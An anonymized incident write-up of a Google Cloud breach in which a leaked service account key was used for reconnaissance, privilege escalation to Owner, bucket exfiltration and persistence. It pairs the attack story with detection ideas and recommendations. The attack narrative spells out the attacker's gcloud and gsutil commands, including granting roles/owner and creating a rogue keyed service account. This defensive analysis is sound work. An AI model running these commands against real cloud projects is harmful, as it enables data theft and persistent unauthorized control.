ğŸ›¡ GCP Service Account Key Abuse (Anonymized)
ğŸ“Œ Executive Summary

This case describes a GCP compromise where a leaked service account key was abused.
The attacker authenticated directly to Google Cloud APIs, escalated privileges by impersonating other service accounts, and accessed sensitive GCS buckets.
Persistence was achieved by creating a new service account with Owner role.

ğŸ¯ Outcome: confirmed cloud credential theft, privilege escalation, sensitive data exfiltration, and persistence.

___________________________________________________________________________________________________________________________________________________________________

ğŸ–¼ Attack Flow (ASCII Diagram)

+----------------------------+
| External Attacker          |
| (Leaked GCP SA Key)        |
+----------------------------+
             |
             v
+----------------------------+
| gcloud auth activate       |
| (Initial Access)           |
+----------------------------+
             |
             v
+----------------------------+
| Reconnaissance             |
| - gcloud projects list     |
| - gcloud storage buckets   |
+----------------------------+
             |
             v
+----------------------------+
| Privilege Escalation       |
| Service Account Imperson.  |
| â†’ Owner Role               |
+----------------------------+
             |
             v
+----------------------------+
| Data Exfiltration          |
| gsutil cp GCS â†’ External   |
+----------------------------+
             |
             v
+----------------------------+
| Persistence                |
| New SA Key w/ Owner Role   |
+----------------------------+

___________________________________________________________________________________________________________________________________________________________________

ğŸ“– Attack Narrative

---------------------------------------
Stage 1 â€“ Initial Access

ğŸ”´ Leaked service account JSON key discovered in public GitHub repo.

ğŸŸ¡ Attacker authenticated via:
gcloud auth activate-service-account --key-file=key.json

---------------------------------------
Stage 2 â€“ Reconnaissance

ğŸ”´ Enumerated projects:
gcloud projects list

ğŸŸ¡ Listed storage buckets:
gcloud storage buckets list

---------------------------------------
Stage 3 â€“ Privilege Escalation

ğŸ”´ Abused Service Account Impersonation to escalate to roles/owner:

gcloud iam service-accounts add-iam-policy-binding \
   victim-sa@project.iam.gserviceaccount.com \
   --member="serviceAccount:attacker-sa@project.iam.gserviceaccount.com" \
   --role="roles/owner"

---------------------------------------
Stage 4 â€“ Exfiltration & Persistence

ğŸ”´ Exfiltrated bucket data:

gsutil -m cp -r gs://sensitive-bucket ./loot

ğŸŸ¡ Created new service account + key with roles/owner:

gcloud iam service-accounts create rogue-sa
gcloud projects add-iam-policy-binding project-id \
   --member="serviceAccount:rogue-sa@project.iam.gserviceaccount.com" \
   --role="roles/owner"
gcloud iam service-accounts keys create rogue-key.json \
   --iam-account=rogue-sa@project.iam.gserviceaccount.com

___________________________________________________________________________________________________________________________________________________________________

â±ï¸ Timeline (UTC)

| Time  | Event                                          |
| ----- | ---------------------------------------------- |
| 11:05 | ğŸ”´ SA key used for authentication              |
| 11:15 | ğŸŸ¡ Recon: listed projects and storage buckets  |
| 11:30 | ğŸ”´ Service account impersonation â†’ Owner role  |
| 11:45 | ğŸ”´ Exfiltration: GCS data copied externally    |
| 12:10 | ğŸŸ¡ New SA + Owner role created for persistence |

___________________________________________________________________________________________________________________________________________________________________

ğŸ“‚ Artifacts (Synthetic / Cloud Audit Logs)

{
  "protoPayload": {
    "methodName": "google.iam.credentials.v1.IAMCredentials.GenerateAccessToken",
    "authenticationInfo": {
      "principalEmail": "attacker@external.com"
    },
    "serviceName": "iamcredentials.googleapis.com"
  },
  "resource": { "type": "service_account" },
  "timestamp": "2025-07-21T11:05:23Z"
}

{
  "protoPayload": {
    "methodName": "storage.objects.list",
    "authenticationInfo": { "principalEmail": "victim-sa@project.iam.gserviceaccount.com" },
    "serviceName": "storage.googleapis.com"
  },
  "resource": { "type": "gcs_bucket", "labels": { "bucket_name": "sensitive-bucket" } },
  "timestamp": "2025-07-21T11:15:44Z"
}

{
  "protoPayload": {
    "methodName": "google.iam.admin.v1.CreateServiceAccount",
    "authenticationInfo": { "principalEmail": "attacker@external.com" },
    "serviceName": "iam.googleapis.com"
  },
  "resource": { "type": "project", "labels": { "project_id": "project-id" } },
  "timestamp": "2025-07-21T12:10:05Z"
}

___________________________________________________________________________________________________________________________________________________________________

ğŸ§¾ IOCs (Synthetic)

| Type    | Value                                                                                         | Status           |
| ------- | --------------------------------------------------------------------------------------------- | ---------------- |
| Account | [victim-sa@project.iam.gserviceaccount.com](mailto:victim-sa@project.iam.gserviceaccount.com) | Abused           |
| Account | [rogue-sa@project.iam.gserviceaccount.com](mailto:rogue-sa@project.iam.gserviceaccount.com)   | Persistence      |
| Key     | `key.json` (public repo leak)                                                                 | Compromised      |
| Bucket  | gs\://sensitive-bucket                                                                        | Exfiltrated      |
| Tool    | gcloud, gsutil                                                                                | Used by attacker |

___________________________________________________________________________________________________________________________________________________________________

ğŸ”‘ Key Findings


Service account key exposed in public repo.

Attacker escalated via SA impersonation â†’ Owner role.

Sensitive data exfiltrated from Google Cloud Storage.

Persistence maintained via new rogue SA with Owner role.

___________________________________________________________________________________________________________________________________________________________________

ğŸ—‚ï¸ MITRE ATT&CK Mapping


T1552.001 â€“ Unsecured Credentials (Exposed Keys)

T1078.004 â€“ Valid Accounts: Cloud Accounts

T1098 â€“ Account Manipulation (SA Impersonation)

T1530 â€“ Data Exfiltration from Cloud Storage

T1136.003 â€“ Create Account (New Service Account)

___________________________________________________________________________________________________________________________________________________________________

ğŸ‘€ Detection Use Cases


ğŸš¨ Alert on usage of service account keys from unknown IPs.

Detect gcloud auth activate-service-account executions.

Monitor SA impersonation calls â†’ privilege escalation.

Alert on creation of new service accounts with roles/owner.

Detect large-volume gsutil cp activity to external destinations.

___________________________________________________________________________________________________________________________________________________________________

ğŸ›¡ï¸ Recommendations


Rotate & revoke leaked service account keys immediately.

Use Workload Identity Federation instead of long-lived keys.

Restrict SA impersonation to least privilege.

Enable Cloud Audit Logs for SA activity.

Implement DLP & monitoring for GCS bucket exfiltration.
